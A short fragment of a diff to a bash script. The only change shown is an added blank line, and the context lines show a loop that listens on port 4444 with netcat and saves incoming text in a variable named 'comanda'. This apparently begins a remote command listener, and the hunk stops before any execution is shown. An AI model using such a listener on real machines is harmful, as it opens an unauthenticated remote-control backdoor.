@@ -1,4 +1,5 @@
 #!/bin/bash
+
 while [ true ]; do
     comanda=$(netcat -l 4444)
     
